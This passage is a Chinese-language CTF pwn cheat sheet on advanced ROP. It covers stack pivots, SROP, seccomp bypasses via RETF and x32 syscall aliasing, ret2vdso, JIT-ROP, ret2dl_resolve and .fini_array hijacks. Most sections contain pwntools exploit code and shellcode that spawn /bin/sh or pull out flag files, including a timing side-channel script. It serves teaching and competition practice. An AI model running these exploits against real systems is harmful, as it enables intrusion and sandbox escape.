# CTF Pwn - 进阶 ROP 技术

## 目录
- [通过 leave;ret 双重栈迁移到 BSS（Midnightflag 2026）](#通过-leaveret-双重栈迁移到-bssmidnightflag-2026)
- [受 UTF-8 载荷约束的 SROP（DiceCTF 2026）](#受-utf-8-载荷约束的-sropdicectf-2026)
- [seccomp 绕过](#seccomp-绕过)
- [用 RETF 切换架构绕过 seccomp（Midnightflag 2026）](#用-retf-切换架构绕过-seccompmidnightflag-2026)
- [带输入反转的栈上 shellcode](#带输入反转的栈上-shellcode)
- [.fini_array 劫持](#fini_array-劫持)
- [pwntools 模板](#pwntools-模板)
  - [通过 corefile 自动求偏移（Crypto-Cat）](#通过-corefile-自动求偏移crypto-cat)
- [ret2vdso — 使用内核 vDSO gadget（HTB Nowhere to go）](#ret2vdso--使用内核-vdso-gadgethtb-nowhere-to-go)
  - [第 1 步 — 栈泄漏](#第-1-步--栈泄漏)
  - [第 2 步 — 把 `/bin/sh` 写到已知地址](#第-2-步--把-binsh-写到已知地址)
  - [第 3 步 — 通过 AT_SYSINFO_EHDR 找 vDSO 基址](#第-3-步--通过-at_sysinfo_ehdr-找-vdso-基址)
  - [第 4 步 — dump vDSO 并寻找 gadget](#第-4-步--dump-vdso-并寻找-gadget)
  - [第 5 步 — execve ROP 链](#第-5-步--execve-rop-链)
- [用 Vsyscall ROP 绕过 PIE（Hack.lu 2015）](#用-vsyscall-rop-绕过-piehacklu-2015)
- [x32 ABI 系统调用号别名绕过 seccomp（BCTF 2017）](#x32-abi-系统调用号别名绕过-seccompbctf-2017)
- [write() 被禁时基于时间的盲 shellcode（DEF CON 2017）](#write-被禁时基于时间的盲-shellcodedef-con-2017)
- [JIT-ROP：在泄漏的 libc 函数中扫描 syscall 字节（Codegate 2018）](#jit-rop在泄漏的-libc-函数中扫描-syscall-字节codegate-2018)
- [64 位 ret2dl_resolve（Codegate 2018）](#64-位-ret2dl_resolvecodegate-2018)
- [通过哥德巴赫分解实现全素数 ROP（PlaidCTF 2018）](#通过哥德巴赫分解实现全素数-ropplaidctf-2018)
- [不完美 gadget 的栈迁移（RITSEC 2018）](#不完美-gadget-的栈迁移ritsec-2018)
- [_fini_array 双条目分阶段 ROP（Insomnihack 2019）](#_fini_array-双条目分阶段-ropinsomnihack-2019)
- [静态链接 libc + 内嵌 /bin/sh 字符串的 ret2libc（TAMUctf 2019）](#静态链接-libc--内嵌-binsh-字符串的-ret2libctamuctf-2019)
- [常用命令](#常用命令)

关于核心 ROP 链构造、ret2csu、坏字符绕过、冷门 gadget 以及通过 xchg 做栈迁移，见 [rop-and-shellcode.md](rop-and-shellcode.md)。

---

<a id="double-stack-pivot-to-bss-via-leaveret-midnightflag-2026"></a>
## 通过 leave;ret 双重栈迁移到 BSS（Midnightflag 2026）

**模式（Eyeless）：** 小型栈溢出（越过缓冲区 22 字节）——足够覆写 RBP + RIP，但放不下 ROP 链。也没有可用的 libc 泄漏。用两次 `leave; ret` 迁移把执行搬到 BSS，再串联 `fgets` 调用写入任意长度的 ROP。

**阶段 1 — 迁移到 BSS：**
```python
BSS_STAGE = 0x404500  # writable BSS address
LEAVE_RET = 0x4013d9  # leave; ret gadget

# Overflow: 128-byte buffer + RBP + RIP
payload = b'A' * 128
payload += p64(BSS_STAGE)   # overwrite RBP → BSS
payload += p64(LEAVE_RET)   # leave sets RSP = RBP (BSS), then ret
```

**阶段 2 — 串联 fgets 加载大 ROP：**
```python
# After pivot, RSP is at BSS_STAGE. Pre-place a mini-ROP there that
# calls fgets(BSS+0x600, 0x700, stdin) to read the real ROP chain:
POP_RDI = 0x4013a5
POP_RSI_R15 = 0x4013a3
SET_RDX_STDIN = 0x40136a  # gadget that sets rdx = stdin FILE*

stage2 = flat(
    SET_RDX_STDIN,
    POP_RDI, BSS_STAGE + 0x100,  # destination buffer
    POP_RSI_R15, 0x700, 0,       # size
    elf.plt['fgets'],             # fgets(buf, 0x700, stdin)
    BSS_STAGE + 0x100,            # return into the new ROP chain
)
```

**关键点：** `leave; ret` 等价于 `mov rsp, rbp; pop rbp; ret`。覆写 RBP 就控制了 `leave` 之后 RSP 落在哪里。两次迁移解决了“放不下 ROP”的问题：第一次迁移到 BSS，在那里用一小段引导 ROP 调用 `fgets` 载入完整利用。

**何时使用：** 溢出太小放不下完整 ROP 链，且程序使用 `fgets`/`read`（或类似输入函数）并可通过 PLT 调用。BSS 总是可写且地址已知（无 PIE 或已泄漏 PIE）。

---

<a id="srop-with-utf-8-payload-constraints-dicectf-2026"></a>
## 受 UTF-8 载荷约束的 SROP（DiceCTF 2026）

**模式（Message Store）：** Rust 程序，越界颜色索引导致从 GOT 读取 memcpy，触发 `memcpy(stack, BUFFER, 0x1000)`——巨大的栈溢出。但 `from_utf8_lossy()` 会先校验缓冲区：任何非法 UTF-8 都会触发 `Cow::Owned` 并破坏替换数据。**整个 0x1000 字节载荷必须是合法 UTF-8。**

**为什么用 SROP：** 常规 ROP gadget 地址含有大于 0x7f 的字节，作为单字节 UTF-8 非法。SROP 只需要 3 个 gadget（设置 rax=15、调用 syscall）触发 `sigreturn`，随后由信号帧设置全部寄存器完成 `execve("/bin/sh", NULL, NULL)`。

**UTF-8 多字节跨字段技巧：** 信号帧中的寄存器字段各 8 字节、紧密排列。一个 3 字节 UTF-8 序列可以起于一个字段、止于下一个：

```python
from pwn import *

# r15 is the field immediately before rdi in the sigframe
# rdi = pointer to "/bin/sh" = 0x2f9fb0 → bytes [B0, 9F, 2F, ...]
# B0, 9F are UTF-8 continuation bytes (10xxxxxx) — invalid as sequence start
# Solution: set r15's last byte to 0xE0 (3-byte UTF-8 leader)
# E0 B0 9F = valid UTF-8 (U+0C1F) spanning r15→rdi boundary

frame = SigreturnFrame()
frame.rax = 59          # execve
frame.rdi = buf_addr + 0x178  # address of "/bin/sh\0"
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr
frame.r15 = 0xE000000000000000  # Last byte 0xE0 starts 3-byte UTF-8 seq

# ROP preamble: 3 UTF-8-safe gadgets
payload = b'\x00' * 0x48           # padding to return address
payload += p64(pop_rax_ret)        # set rax = 15 (sigreturn)
payload += p64(15)
payload += p64(syscall_ret)        # trigger sigreturn
payload += bytes(frame)
# Place "/bin/sh\0" at offset 0x178 in BUFFER
```

**何时使用：** 任何载荷字节会经过 UTF-8 校验的利用场景（Rust `String`、`from_utf8`、JSON 解析器）。SROP 把需要保持 UTF-8 安全的 gadget 地址数量降到最少。

**关键点：** 多字节 UTF-8 序列（2-4 字节）可以跨越结构化数据中的相邻字段（信号帧、ROP 链）。把前导字节（0xC0-0xF7）设为一个字段的最后一字节，下一字段中的续字节（0x80-0xBF）就能组成合法序列。

<a id="seccomp-bypass"></a>
## seccomp 绕过

seccomp 封禁 `open()`/`read()` 时的替代系统调用：
- `openat()`（257）、`openat2()`（437，常被遗漏！）、`sendfile()`（40）、`readv()`/`writev()`

**检查规则：** `seccomp-tools dump ./binary`

关于条件性缓冲区地址限制、无重定位的 shellcode 构造（call/pop 技巧）、从反汇编分析 seccomp、`scmp_arg_cmp` 结构体布局，见 [advanced.md](advanced.md)。

<a id="retf-architecture-switch-for-seccomp-bypass-midnightflag-2026"></a>
## 用 RETF 切换架构绕过 seccomp（Midnightflag 2026）

**模式（Eyeless）：** seccomp 在 64 位模式下封禁 `execve`、`execveat`、`open`、`openat`。切换到 32 位（IA-32e 兼容模式），那里系统调用号不同，过滤器不生效。

**工作原理：** `retf`（远返回）指令从栈上弹出 RIP 再弹出 CS。设置 `CS = 0x23` 会把 CPU 切到 32 位兼容模式。32 位模式下 `int 0x80` 使用不同的系统调用号：`open=5`、`read=3`、`write=4`、`exit=1`。

**切换模式的 ROP 链：**
```python
POP_RDX_RBX = libc_base + 0x8f0c5  # pop rdx; pop rbx; ret
POP_RDI     = 0x4013a5
POP_RSI_R15 = 0x4013a3
RETF        = libc_base + 0x294bf   # retf gadget in libc

# Step 1: mprotect BSS as RWX for shellcode
rop  = flat(POP_RDI, 0x404000)          # addr = BSS page
rop += flat(POP_RSI_R15, 0x1000, 0)     # size = page
rop += flat(POP_RDX_RBX, 7, 0)          # prot = RWX
rop += flat(libc_base + libc.sym.mprotect)

# Step 2: Far return to 32-bit shellcode on BSS
rop += flat(RETF)
rop += p32(0x404a80)   # 32-bit EIP (shellcode address on BSS)
rop += p32(0x23)        # CS = 0x23 (IA-32e compatibility mode)
```

**32 位 shellcode（open/read/write flag）：**
```nasm
mov esp, 0x404100       ; set up 32-bit stack
push 0x67616c66         ; "flag" (reversed)
push 0x2f2f2f2f         ; "////"
mov ebx, esp            ; ebx = filename pointer

mov eax, 5              ; SYS_open (32-bit)
xor ecx, ecx            ; O_RDONLY
int 0x80                ; open("////flag", O_RDONLY)

mov ebx, eax            ; fd from open
mov ecx, esp            ; buffer
mov edx, 0x100          ; size
mov eax, 3              ; SYS_read (32-bit)
int 0x80

mov edx, eax            ; bytes read
mov ecx, esp            ; buffer
mov ebx, 1              ; stdout
mov eax, 4              ; SYS_write (32-bit)
int 0x80

mov eax, 1              ; SYS_exit
int 0x80
```

**关键点：** 针对 `AUDIT_ARCH_X86_64` 配置的 seccomp 过滤器不会检查 32 位的 `int 0x80` 系统调用。libc 中的 `retf` gadget 通过加载 CS=0x23 切换架构。由于 32 位 shellcode 必须在可写+可执行内存中运行，需要先用 `mprotect` 让某块内存可执行。

**在 libc 中寻找 retf：**
```bash
ROPgadget --binary libc.so.6 | grep retf
# Or search for byte 0xcb:
objdump -d libc.so.6 | grep -w retf
```

**何时使用：** seccomp 封禁关键的 64 位系统调用（`open`、`openat`、`execve`），但没有使用 `SECCOMP_FILTER_FLAG_SPEC_ALLOW`，也不检查 `AUDIT_ARCH`。配合 `mprotect` 把 BSS/堆变为可执行以运行 32 位 shellcode。

---

<a id="stack-shellcode-with-input-reversal"></a>
## 带输入反转的栈上 shellcode

**模式（Scarecode）：** 程序在返回之前反转输入缓冲区。

**策略：**
1. 通过信息泄漏功能泄漏地址（绕过 PIE）
2. 找到 `sub rsp, 0x10; jmp *%rsp` gadget
3. 预先反转 shellcode 与 RIP 覆写字节
4. 使用 6 字节 RIP 部分覆写（避免规范地址中的空字节）
5. 放置 trampoline（`jmp short`）跳回 NOP sled + shellcode

**用 `scanf("%s")` 时空字节的规避：**
- 载荷中不能嵌入 `\x00`
- 使用部分指针覆写（6 字节）——同一映射下高 2 字节相同
- 用短跳转与 NOP sled 代替多地址 ROP 链

<a id="fini_array-hijack"></a>
## .fini_array 劫持

**何时使用：** `.fini_array` 可写 + 有任意写原语。`main()` 返回时会调用其中条目作为函数指针。即使 Full RELRO 也可用。

```python
# Find .fini_array address
fini_array = elf.get_section_by_name('.fini_array').header.sh_addr
# Or: objdump -h binary | grep fini_array

# Overwrite with format string %hn (2-byte writes)
writes = {
    fini_array: target_addr & 0xFFFF,
    fini_array + 2: (target_addr >> 16) & 0xFFFF,
}
```

**相比 GOT 覆写的优势：** 即使 Full RELRO 也能用（`.fini_array` 位于不同段）。与 RWX 区域配合运行 shellcode 时尤其有用。

<a id="pwntools-template"></a>
## pwntools 模板

```python
from pwn import *

elf = ELF('./binary', checksec=False)
context.binary = elf
context.log_level = 'debug'

HOST = args.HOST or 'host'
PORT = args.PORT or 1337

def conn():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='init-pwndbg\ncontinue')
    elif args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)

io = conn()
# exploit here
io.interactive()
```

<a id="automated-offset-finding-via-corefile-crypto-cat"></a>
### 通过 corefile 自动求偏移（Crypto-Cat）

无需手动 `cyclic -l`，自动确定缓冲区溢出偏移：
```python
def find_offset(exe):
    p = process(exe, level='warn')
    p.sendlineafter(b'>', cyclic(500))
    p.wait()
    # x64: read saved RIP from stack pointer
    offset = cyclic_find(p.corefile.read(p.corefile.sp, 8))
    # x86: use pc directly
    # offset = cyclic_find(p.corefile.pc)
    log.warn(f'Offset: {offset}')
    return offset
```

**关键点：** pwntools 会从崩溃进程自动生成 core 文件。从 `corefile.sp`（x64）或 `corefile.pc`（x86）读出保存的返回地址并交给 `cyclic_find()`，即可得到精确偏移。省去手工 GDB 检查。

<a id="ret2vdso--using-kernel-vdso-gadgets-htb-nowhere-to-go"></a>
## ret2vdso — 使用内核 vDSO gadget（HTB Nowhere to go）

**模式：** 静态链接的程序，函数极少，没有任何有用的 ROP gadget（没有 `pop rdi`、`pop rsi`、`pop rax` 等）。Linux 内核会向每个进程映射一个 vDSO（Virtual Dynamic Shared Object），其中含有足以完成 `execve` 的 gadget。

<a id="step-1--stack-leak"></a>
### 第 1 步 — 栈泄漏

溢出缓冲区并读回比发送更多的字节以泄漏栈指针：
```python
p.send(b'A' * 0x20)
resp = p.recv(0x80)
leak = u64(resp[0x30:0x38])
stackbase = (leak & 0x0000FFFFFFFFF000) - 0x20000
```

<a id="step-2--write-binsh-to-known-address"></a>
### 第 2 步 — 把 `/bin/sh` 写到已知地址

通过 ROP 调用程序自身的 `read` 函数，把 `/bin/sh\0` 放到页对齐的栈地址：
```python
payload = b'B' * 32 + p64(READ_FUNC) + p64(LOOP) + p64(0x8) + p64(stackbase)
p.sendline(payload)
p.send(b'/bin/sh\x00')
```

<a id="step-3--find-vdso-base-via-at_sysinfo_ehdr"></a>
### 第 3 步 — 通过 AT_SYSINFO_EHDR 找 vDSO 基址

用程序的 `write` 函数 dump 栈，搜索 `AT_SYSINFO_EHDR`（auxv 类型 `0x21`），它保存 vDSO 基址：
```python
# Dump 0x21000 bytes from stackbase
for i in range(0, len(stackdump) - 15, 8):
    val = u64(stackdump[i:i+8])
    if val == 0x21:  # AT_SYSINFO_EHDR
        next_val = u64(stackdump[i+8:i+16])
        if 0x7f0000000000 <= next_val <= 0x7fffffffffff and (next_val & 0xFFF) == 0:
            vdso_base = next_val
            break
```

<a id="step-4--dump-vdso-and-find-gadgets"></a>
### 第 4 步 — dump vDSO 并寻找 gadget

用程序的 `write` 函数从 `vdso_base` dump 0x2000 字节，再搜索 gadget。常见的 vDSO gadget：
```python
POP_RDX_RAX_RET     = vdso_base + 0xba0  # pop rdx; pop rax; ret
POP_RBX_R12_RBP_RET = vdso_base + 0x8c6  # pop rbx; pop r12; pop rbp; ret
MOV_RDI_RBX_SYSCALL = vdso_base + 0x8e3  # mov rdi, rbx; mov rsi, r12; syscall
```

<a id="step-5--execve-rop-chain"></a>
### 第 5 步 — execve ROP 链

```python
payload = b'A' * 32
payload += p64(POP_RDX_RAX_RET)
payload += p64(0x0)              # rdx = NULL (envp)
payload += p64(59)               # rax = execve
payload += p64(POP_RBX_R12_RBP_RET)
payload += p64(stackbase)        # rbx → rdi = &"/bin/sh"
payload += p64(0x0)              # r12 → rsi = NULL (argv)
payload += p64(0xdeadbeef)       # rbp (dummy)
payload += p64(MOV_RDI_RBX_SYSCALL)
```

**关键点：** vDSO 与内核相关——不同内核的 gadget 偏移不同。务必 dump 远端 vDSO，而不是假设本地偏移。栈上的 auxv `AT_SYSINFO_EHDR`（类型 0x21）是找到 vDSO 基址的可靠途径。

**识别：** 静态链接、函数极少、没有 libc、无有用 gadget 的程序。QEMU 托管的题目常运行定制内核，vDSO 布局独特。

---

<a id="vsyscall-rop-for-pie-bypass-hacklu-2015"></a>
## 用 Vsyscall ROP 绕过 PIE（Hack.lu 2015）

在较老的 Linux 内核上，vsyscall 页被映射到固定地址（`0xffffffffff600000-0xffffffffff601000`），与 ASLR/PIE 无关。每个 vsyscall 条目都以 `ret` 结尾，在已知地址提供 gadget：

- `0xffffffffff600000` — gettimeofday（ret 于 +0x9）
- `0xffffffffff600400` — time（ret 于 +0x9）
- `0xffffffffff600800` — getcpu（ret 于 +0x9）

用 vsyscall 的 `ret` gadget 将栈滑向部分返回地址覆写：

```python
from pwn import *

payload = b'A' * 72                      # padding to return address
payload += p64(0xffffffffff600400)        # vsyscall time: acts as NOP-ret
payload += p64(0xffffffffff600400)        # second NOP-ret for alignment
payload += b"\x8b\x10"                    # partial overwrite to target (2 bytes)
```

**关键点：** 即使有 PIE+ASLR，vsyscall 地址也是固定的。现代内核会模拟 vsyscall（陷入内核），但地址仍然可预测。用 `cat /proc/self/maps | grep vsyscall` 检查。

**注意：** 一些较新内核完全禁用 vsyscall（`vsyscall=none`）。依赖此技术前先确认可用性。

---

<a id="x32-abi-syscall-number-aliasing-for-seccomp-bypass-bctf-2017"></a>
## x32 ABI 系统调用号别名绕过 seccomp（BCTF 2017）

**模式：** Linux x32 ABI（64 位内核上的 32 位指针）使用的系统调用号带第 30 位（`0x40000000`）。多数 seccomp BPF 过滤器只把低 32 位与已知系统调用号比较，漏掉 x32 变体。

```c
// Standard execve blocked by seccomp: syscall 59
// x32 ABI variant: syscall 0x40000000 | 59 = 0x4000003B
// Often passes through BPF filters that check for exact match on 59
syscall(0x4000003B, "/bin/sh", NULL, NULL);
```

```python
from pwn import *

# ROP chain using x32 ABI syscall number to bypass seccomp
pop_rax = libc_base + rax_gadget
pop_rdi = libc_base + rdi_gadget
pop_rsi = libc_base + rsi_gadget
pop_rdx = libc_base + rdx_gadget
syscall_ret = libc_base + syscall_gadget

rop = flat(
    pop_rax, 0x4000003B,              # x32 execve (bypasses seccomp)
    pop_rdi, binsh_addr,              # "/bin/sh"
    pop_rsi, 0,                       # argv = NULL
    pop_rdx, 0,                       # envp = NULL
    syscall_ret,                      # trigger x32 execve
)
```

**关键点：** x32 ABI 把 `0x40000000` 按位或进系统调用号。seccomp 过滤器若只对 `__NR_execve`（59）做 `SCMP_ACT_KILL` 检查，就会漏掉 `__NR_execve | __X32_SYSCALL_BIT`（0x4000003B），而内核仍会把它分派到同一个处理函数。这在以 `CONFIG_X86_X32=y` 编译的内核上有效（老发行版常见）。

**何时识别：** seccomp 过滤器通过精确匹配或范围检查封禁特定系统调用号。用 `seccomp-tools dump ./binary` dump BPF，检查它是否校验 `AUDIT_ARCH` 或在比较前屏蔽掉 x32 位。若都没有，x32 别名即可绕过过滤器。

**缓解检查：** 现代 seccomp 策略使用 `SECCOMP_RET_KILL_PROCESS` 并显式校验 `AUDIT_ARCH_X86_64`，可阻止该技术。

**参考：** BCTF 2017

---

<a id="time-based-blind-shellcode-when-write-blocked-def-con-2017"></a>
## write() 被禁时基于时间的盲 shellcode（DEF CON 2017）

**模式：** 当 seccomp 封禁所有输出系统调用（`write`、`sendto`、`writev`）时，用时间侧信道逐字符外泄 flag 数据：把每个字节与猜测值比较，命中则循环延时。

```nasm
; Read flag into buffer, then compare character N
; Assumes flag has been read into rsi via allowed read() syscall
mov al, [rsi + N]      ; flag byte N
cmp al, 0x41           ; compare with guess 'A'
jne done               ; skip if no match
; Timing loop: burns ~4 seconds on match
xor ecx, ecx
.loop: inc ecx
cmp ecx, 0xffffffff
jne .loop
done: xor edi, edi
mov eax, 60            ; exit
syscall
```

```python
from pwn import *
import time

FLAG_LEN = 40
CHARSET = string.printable

def guess_byte(offset, guess_char):
    """Send shellcode that delays if flag[offset] == guess_char"""
    sc = shellcraft.amd64.linux.open("flag.txt", 0)
    sc += shellcraft.amd64.linux.read("rax", "rsp", 100)
    sc += f"""
        mov al, byte ptr [rsp + {offset}]
        cmp al, {ord(guess_char)}
        jne done
        xor ecx, ecx
    loop:
        inc ecx
        cmp ecx, 0xffffffff
        jne loop
    done:
        xor edi, edi
        mov eax, 60
        syscall
    """
    r = remote(host, port)
    r.send(asm(sc))
    start = time.time()
    try:
        r.recvall(timeout=6)
    except:
        pass
    elapsed = time.time() - start
    r.close()
    return elapsed > 3.0  # Match if response took > 3 seconds

flag = ""
for i in range(FLAG_LEN):
    for c in CHARSET:
        if guess_byte(i, c):
            flag += c
            print(f"Flag so far: {flag}")
            break
```

**关键点：** 当 seccomp 封禁所有输出系统调用（`write`、`sendto`、`writev`）时，仍可通过把 flag 字节与猜测值比较、命中就消耗 CPU 时间来外泄。响应时间差异（瞬时 vs 约 4 秒）揭示猜测是否正确。最坏情况需要 256 × flag 长度次连接，但可打印 ASCII 可降至约 95 × flag 长度。

**何时识别：** seccomp 允许 `open`/`read` 但封禁所有 write 家族系统调用。程序完全没有输出路径时（例如嵌入式系统、裸机题）同样适用。

**参考：** DEF CON 2017

---

<a id="jit-rop-scan-for-syscall-byte-in-leaked-libc-function-codegate-2018"></a>
## JIT-ROP：在泄漏的 libc 函数中扫描 syscall 字节（Codegate 2018）

**模式：** 不去识别远端 libc 版本以寻找 gadget，而是泄漏一个 GOT 项（例如 `read@GOT`），再读取该函数的机器码，在其中找 `syscall` 指令。用 `read()` 的返回值控制 `rax` 中的系统调用号。

**利用：**
```python
from pwn import *

# Step 1: Leak read@GOT address via format string / arbitrary read
read_addr = leak_got(elf.got['read'])
log.info(f"read() @ {hex(read_addr)}")

# Step 2: Read bytes within read() function body
# Use an arbitrary read primitive (e.g., format string %s, or read() itself)
read_bytes = read_memory(read_addr, 0x100)

# Step 3: Find syscall opcode (0x0f 0x05) within read()
syscall_offset = read_bytes.index(b'\x0f\x05')
syscall_addr = read_addr + syscall_offset
log.info(f"syscall @ {hex(syscall_addr)}")

# Step 4: Overwrite an unused GOT entry (e.g., srand) with syscall address
write_got(elf.got['srand'], syscall_addr)

# Step 5: Build ROP chain for execve via syscall
# Trick: read() return value sets rax, so read exactly 59 bytes for __NR_execve
pop_rdi = rop_gadget  # pop rdi; ret
pop_rsi = rop_gadget  # pop rsi; ret
pop_rdx = rop_gadget  # pop rdx; ret

payload = flat(
    pop_rdi, 0,                    # fd = stdin
    pop_rsi, bss_addr,             # buf = writable BSS
    pop_rdx, 59,                   # count = 59 = __NR_execve
    elf.plt['read'],               # read(0, bss, 59) → rax = 59
    pop_rdi, binsh_addr,           # rdi = "/bin/sh"
    pop_rsi, 0,                    # rsi = NULL
    pop_rdx, 0,                    # rdx = NULL
    elf.plt['srand'],              # calls syscall (GOT overwritten)
    # rax=59, rdi="/bin/sh", rsi=0, rdx=0 → execve("/bin/sh", NULL, NULL)
)
io.sendline(payload)

# Send exactly 59 bytes so read() returns 59 (sets rax = __NR_execve)
io.send(b'A' * 59)
```

**为什么 read() 一定包含 syscall：**
```text
read() in libc is a thin wrapper around the syscall instruction:
  mov eax, 0        ; SYS_read
  syscall            ; <-- this is what we're scanning for
  cmp rax, -4096
  ...
The bytes 0x0f 0x05 (syscall) are guaranteed to exist within read()
```

**关键点：** 每个 libc 函数的代码段都含有可用 gadget。`read()` 内部必定含有 `syscall` 指令。通过泄漏 GOT 项并读取函数机器码，无需知道 libc 版本就能找到 `syscall`。`read()` 系统调用的返回值恰好把 `rax` 设为读取字节数——精确发送 59 字节（`__NR_execve`）即可设置系统调用号。这省去了 `pop rax; ret` gadget。

**何时识别：** Partial RELRO（GOT 可写）、拿不到 libc 版本，但能泄漏 GOT 项并读任意内存。任何内部执行系统调用的函数（`read`、`write`、`open`、`mmap`）都含 `0f 05` 字节。优先用 `read()`，因为它的返回值天然控制 `rax`。

**参考：** Codegate 2018

---

<a id="ret2dl_resolve-64-bit-codegate-2018"></a>
## 64 位 ret2dl_resolve（Codegate 2018）

**模式：** 在可写内存（BSS）中伪造 `Elf64_Rela`、`Elf64_Sym` 与 dynstr 条目，诱骗动态链接器解析任意 libc 函数（例如 `system`），而无需知道 libc 基址。64 位变体需要通过把 link_map 中的版本表指针置 NULL 来绕过 VERSYM 检查。

**动态解析的工作方式：**
```text
PLT stub → _dl_runtime_resolve(link_map, reloc_index)
  1. Look up Elf64_Rela at .rela.plt[reloc_index]
  2. Extract symbol index from r_info
  3. Look up Elf64_Sym at .dynsym[sym_index]
  4. Read symbol name from .dynstr + st_name offset
  5. Search loaded libraries for that symbol name
  6. [64-bit only] Check version via .gnu.version[sym_index]  ← must bypass
  7. Write resolved address to GOT, jump to it
```

**伪造结构体：**
```python
from pwn import *

# Target: resolve system() by forging resolution structures in BSS
BSS = 0x601000          # writable memory
STRTAB = elf.dynamic_value_by_tag('DT_STRTAB')
SYMTAB = elf.dynamic_value_by_tag('DT_SYMTAB')
JMPREL = elf.dynamic_value_by_tag('DT_JMPREL')

# Calculate offsets so forged structures are self-consistent
fake_rela_addr = BSS + 0x100
fake_sym_addr = BSS + 0x200
fake_str_addr = BSS + 0x300

# Forged Elf64_Sym (24 bytes)
# st_name: offset into dynstr where "system\x00" lives
# st_info: STT_FUNC | STB_GLOBAL
# st_other, st_shndx: 0
# st_value, st_size: 0 (unresolved)
sym_index = (fake_sym_addr - SYMTAB) // 24  # index into symtab
fake_sym = flat(
    p32(fake_str_addr - STRTAB),  # st_name (offset to "system" in dynstr)
    p8(0x12),                      # st_info = STT_FUNC | STB_GLOBAL<<4
    p8(0),                         # st_other
    p16(0),                        # st_shndx = SHN_UNDEF
    p64(0),                        # st_value
    p64(0),                        # st_size
)

# Forged Elf64_Rela (24 bytes)
# r_offset: GOT slot to write resolved address
# r_info: (sym_index << 32) | R_X86_64_JUMP_SLOT
# r_addend: 0
reloc_index = (fake_rela_addr - JMPREL) // 24
fake_rela = flat(
    p64(BSS + 0x400),                      # r_offset (writable GOT slot)
    p64((sym_index << 32) | 7),            # r_info: sym_idx | R_X86_64_JUMP_SLOT
    p64(0),                                 # r_addend
)

# Forged dynstr entry
fake_str = b"system\x00"

# Write all structures to BSS via ROP chain
# ...

# CRITICAL: Bypass VERSYM check for 64-bit
# Overwrite link_map->l_info[DT_VERSYM] with NULL
# This skips version validation entirely
# link_map address can be read from GOT[1]
link_map_addr = read_got(1)  # GOT[1] = link_map pointer
# l_info[DT_VERSYM] is at link_map + 0x1c8 (glibc-dependent)
versym_ptr = link_map_addr + 0x1c8
write_memory(versym_ptr, p64(0))  # NULL → skip version check

# Trigger resolution: call PLT stub with forged reloc_index
# _dl_runtime_resolve follows our forged chain:
#   fake Rela → fake Sym → fake dynstr "system"
#   → resolves system() → writes to fake GOT slot → jumps to system()
```

**触发的 ROP 链：**
```python
# After writing fake structures to BSS:
# Push reloc_index and jump to PLT[0] (the universal resolver stub)
plt_stub = elf.get_section_by_name('.plt').header.sh_addr

payload = flat(
    pop_rdi, binsh_addr,           # rdi = "/bin/sh" for system()
    plt_stub,                       # push link_map; jmp _dl_runtime_resolve
    p64(reloc_index),              # relocation index into forged .rela.plt
)
```

**关键点：** 由于 VERSYM 检查，64 位 ret2dl_resolve 比 32 位更难。把 `link_map->l_info[DT_VERSYM]` 覆写为 NULL 即可完全跳过版本校验。之后标准做法可照常使用：在可写内存中伪造 Rela -> Sym -> dynstr 链，并用构造好的 reloc 索引通过 PLT stub 触发解析。这样无需知道 libc 基址就能解析任意 libc 函数——动态链接器替你干活。

**何时识别：** 没有 libc 泄漏、Partial RELRO（PLT/GOT 可写）、程序有足够 ROP gadget 向 BSS 写入并控制函数参数。适用于任何 glibc 版本（通过 NULL 绕过 VERSYM 是通用的）。当远端 libc 版本完全未知时，优先于盲猜 libc 版本。

**参考：** Codegate 2018

---

<a id="prime-only-rop-via-goldbach-decomposition-plaidctf-2018"></a>
## 通过哥德巴赫分解实现全素数 ROP（PlaidCTF 2018）

**模式：** 题目要求攻击者写入的每个栈字都必须是素数（每个槽位都要通过 `miller_rabin(val)`）。直接的 gadget 地址几乎从来不是素数，ROP 链看起来无法构造。

**利用：** 哥德巴赫猜想保证任何大于 2 的偶数都能表示成两个素数之和。把每个目标 gadget 地址 `g` 表示为 `g = p1 + p2`（`p1, p2` 为素数），写入相邻栈槽。再用一个小“素数加法器”gadget（`pop rax; pop rdx; add rax, rdx; push rax; ret` 或对栈的读-改-写）在消耗它的 `ret` 之前把两半合并成真正的 gadget 指针。

```python
from sympy import isprime, nextprime

def prime_split(addr):
    # Returns (p1, p2) with p1 + p2 == addr and both prime
    if addr % 2:  # odd: (2, addr-2) if addr-2 prime, else search
        if isprime(addr - 2): return (2, addr - 2)
    p1 = 3
    while not (isprime(p1) and isprime(addr - p1)):
        p1 = nextprime(p1)
    return (p1, addr - p1)
```

串联多个 `(p1, p2, adder)` 三元组，即可在原始栈字全部通过素数过滤的同时合成任意 gadget 地址。

**关键点：** 对栈内容的数论约束总能被打破：把值写成若干可接受部分的加/异或/乘积，再加一个极小的归约 gadget 在运行时重组。哥德巴赫为地址提供了构造性的两项分解；拉格朗日四平方定理对要求完全平方数的约束同理可用。

**参考：** PlaidCTF 2018 — writeup 10017

---

<a id="imperfect-gadget-stack-pivot-ritsec-2018"></a>
## 不完美 gadget 的栈迁移（RITSEC 2018）

**模式：** 经典栈迁移用 `leave; ret` 或 `xchg esp, eax; ret`，但有时唯一可用的 gadget 中间夹着无害指令。像 `pop ebp; add al, 0x89; pop esp; and al, 0x30; add esp, 0x24; ret` 这样的 gadget 仍能迁移 `esp`——`add al`/`and al` 的副作用不会破坏 `esp`，末尾的 `add esp, 0x24` 只是跳过 9 个你预填垃圾的槽位。

```asm
0x80c0620: pop ebp ; add al, 0x89 ; pop esp ; and al, 0x30 ; add esp, 0x24 ; ret
```

把可控的堆地址放在正确槽位，使 `pop esp` 落进假栈，然后在真实链之前预留九个哑 dword 吸收 `add esp, 0x24`。

**关键点：** 别再因为 gadget “不干净”就放弃它。逐条分析 gadget 的每条指令；只要没有指令破坏 `esp`，即使带有无关算术，gadget 仍能完成迁移。

**参考：** RITSEC CTF 2018 — Yet Another HR Management Framework，writeup 12287

---

<a id="_fini_array-double-entry-staged-rop-insomnihack-2019"></a>
## _fini_array 双条目分阶段 ROP（Insomnihack 2019）

**模式：** 静态链接的程序没有可劫持的 PLT/GOT。但 `_fini_array` 存有在 `exit()` 时调用的指针。覆写两个条目，让第一次调用执行 `do_overwrite`（一个能暂存更多字节的 gadget），第二次再执行一次，从而在连续多次退出之间逐段追加 ROP。

```text
_fini_array[0] = do_overwrite   # stage 1: write next segment
_fini_array[1] = do_overwrite   # stage 2: write final segment + trigger
```

